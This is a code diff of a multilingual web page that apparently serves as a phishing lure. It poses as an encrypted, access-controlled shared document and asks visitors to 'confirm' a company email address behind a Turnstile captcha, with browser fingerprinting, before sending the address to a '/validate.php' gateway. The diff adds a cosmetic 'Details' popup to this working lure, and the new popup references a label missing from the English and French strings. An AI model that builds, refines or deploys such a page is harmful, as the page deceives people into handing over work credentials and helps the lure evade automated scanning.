@@ -70,6 +70,10 @@
     .captcha-wrapper{display:flex;justify-content:center;align-items:center;margin:8px 0;}
     #cf-turnstile{transform:scale(.85);transform-origin:center;}
 
+    /* small meta list styling */
+    .meta-list{margin:8px 0 0 0;padding:0;list-style:none}
+    .meta-list li{font-size:13px;color:#111;margin:6px 0}
+    .meta-key{color:#6b7280}
     @media (max-width:640px){ body{padding:12px} .file-preview{height:180px} }
   </style>
 </head>
@@ -106,6 +110,7 @@
 
   <div class="overlay" id="overlay" aria-hidden="true"></div>
 
+  <!-- Existing email popup (unchanged) -->
   <div class="popup" id="popup" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
     <form id="emailForm" novalidate autocomplete="off">
       <h3 id="popupTitle">Confirm your email</h3>
@@ -115,7 +120,6 @@
         <p class="error" id="err">Invalid email address</p>
       </div>
 
-      <!-- Turnstile placeholder; we render it explicitly on open -->
       <div class="captcha-wrapper">
         <div id="cf-turnstile" class="cf-turnstile"></div>
       </div>
@@ -127,11 +131,23 @@
     </form>
   </div>
 
+  <!-- NEW: lightweight details popup -->
+  <div class="popup" id="metaPopup" role="dialog" aria-modal="true" aria-labelledby="metaTitle">
+    <div>
+      <h3 id="metaTitle">Details</h3>
+      <ul class="meta-list" id="metaList">
+        <!-- filled dynamically -->
+      </ul>
+      <div class="actions" style="margin-top:12px;">
+        <button type="button" class="btn primary" id="metaClose">Close</button>
+      </div>
+    </div>
+  </div>
+
   <script>
     /* ================== i18n ================== */
     const DICT = {
       en: {
-        
         chipEnc: "End-to-end encrypted",
         chipCtrl: "Access controlled",
         chipExp: "Expires in 7 days",
@@ -144,10 +160,12 @@
         cancel: "Cancel",
         placeholder: "username@company.com",
         errorGeneric: "Unable to process, please try again",
-        redirecting: "Continue…"
+        redirecting: "Continue…",
+        metaTitle: "Details",
+        metaClose: "Close",
+        metaLabels: { name:"Name", info:"Info"}
       },
       fr: {
-        
         chipEnc: "Chiffrement de bout en bout",
         chipCtrl: "Accès contrôlé",
         chipExp: "Expire dans 7 jours",
@@ -160,10 +178,12 @@
         cancel: "Annuler",
         placeholder: "nom@entreprise.com",
         errorGeneric: "Impossible de traiter, veuillez réessayer",
-        redirecting: "Continuer…"
+        redirecting: "Continuer…",
+        metaTitle: "Détails",
+        metaClose: "Fermer",
+        metaLabels: { name:"Nom", info:"Infos" }
       },
       de: {
-        
         chipEnc: "Ende-zu-Ende-verschlüsselt",
         chipCtrl: "Zugriff kontrolliert",
         chipExp: "Läuft in 7 Tagen ab",
@@ -176,10 +196,12 @@
         cancel: "Abbrechen",
         placeholder: "vorname.nachname@firma.de",
         errorGeneric: "Verarbeitung nicht möglich, bitte erneut versuchen",
-        redirecting: "Weiterleitung…"
+        redirecting: "Weiterleitung…",
+        metaTitle: "Details",
+        metaClose: "Schließen",
+        metaLabels: { name:"Name", info:"Info", security:"Sicherheit" }
       },
       nl: {
-        
         chipEnc: "End-to-end versleuteld",
         chipCtrl: "Toegang gecontroleerd",
         chipExp: "Verloopt over 7 dagen",
@@ -192,7 +214,10 @@
         cancel: "Annuleren",
         placeholder: "voornaam.achternaam@bedrijf.nl",
         errorGeneric: "Kan niet verwerken, probeer het opnieuw",
-        redirecting: "Doorsturen…"
+        redirecting: "Doorsturen…",
+        metaTitle: "Details",
+        metaClose: "Sluiten",
+        metaLabels: { name:"Naam", info:"Info", security:"Beveiliging" }
       }
     };
 
@@ -208,7 +233,7 @@
       // Apply translations
       document.documentElement.lang = LANG;
       const $ = (id) => document.getElementById(id);
-      $('previewBanner').textContent = t.banner;
+      $('previewBanner').textContent = t.banner || ' ';
       $('chipEnc').textContent = t.chipEnc;
       $('chipCtrl').textContent = t.chipCtrl;
       $('chipExp').textContent = t.chipExp;
@@ -220,13 +245,19 @@
       $('email')?.setAttribute('placeholder', t.placeholder);
 
       // DOM refs
-      // Use your own origin; nothing public leaks:
       const gateway = "/validate.php";
       const popup = $('popup'), overlay = $('overlay'), openBtn = $('openBtn');
       const form = $('emailForm'), errBox = $('err'), input = $('email'), submitEl = $('submitBtn');
 
+      // NEW: details popup refs
+      const metaPopup = $('metaPopup');
+      const viewMetaBtn = $('viewMeta');
+      const metaCloseBtn = $('metaClose');
+      const metaList = $('metaList');
+      const metaTitle = $('metaTitle');
+
       // Helpers
-      const show = (n, msg) => { if (!n) return; n.textContent = msg || n.textContent; n.style.display = 'block'; };
+      const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
       const hide = (n) => { if (!n) return; n.style.display = 'none'; };
 
       // Turnstile render & callback
@@ -237,7 +268,7 @@
         if (!window.turnstile) return; // script not loaded yet
         if (!widgetId) {
           widgetId = turnstile.render('#cf-turnstile', {
-            sitekey: '0x4AAAAAABhsKFJ88b73jtsO',   // <- your site key
+            sitekey: '0x4AAAAAABhsKFJ88b73jtsO',
             callback: onTurnstileDone,
             theme: 'light'
           });
@@ -253,7 +284,7 @@
         fpHash = btoa(String.fromCharCode(...new Uint8Array(buf)));
       })();
 
-      // Popup open/close
+      // Popup open/close (email)
       openBtn?.addEventListener('click', () => {
         overlay?.classList.add('active');
         popup?.classList.add('active');
@@ -262,10 +293,38 @@
       });
       const close = () => { overlay?.classList.remove('active'); popup?.classList.remove('active'); hide(errBox); };
       $('closeBtn')?.addEventListener('click', close);
-      overlay?.addEventListener('click', close);
-      document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
+      overlay?.addEventListener('click', () => {
+        // close any open popup
+        popup?.classList.remove('active');
+        metaPopup?.classList.remove('active');
+        overlay?.classList.remove('active');
+      });
+      document.addEventListener('keydown', e => {
+        if (e.key === 'Escape') {
+          popup?.classList.remove('active');
+          metaPopup?.classList.remove('active');
+          overlay?.classList.remove('active');
+        }
+      });
 
-      // Submit
+      // NEW: View details → open meta popup
+      viewMetaBtn?.addEventListener('click', () => {
+        // fill list from current DOM
+        metaTitle.textContent = t.metaTitle;
+        metaList.innerHTML = `
+          <li><span class="meta-key">${t.metaLabels.name}:</span> ${$('docTitle').textContent}</li>
+          <li><span class="meta-key">${t.metaLabels.info}:</span> ${$('docMeta').textContent}</li>
+          <li><span class="meta-key">${t.metaLabels.security}:</span> ${$('chipEnc').textContent} • ${$('chipCtrl').textContent} • ${$('chipExp').textContent}</li>
+        `;
+        overlay?.classList.add('active');
+        metaPopup?.classList.add('active');
+      });
+      metaCloseBtn?.addEventListener('click', () => {
+        metaPopup?.classList.remove('active');
+        overlay?.classList.remove('active');
+      });
+
+      // Submit (email)
       form?.addEventListener("submit", async (e) => {
         e.preventDefault();
 
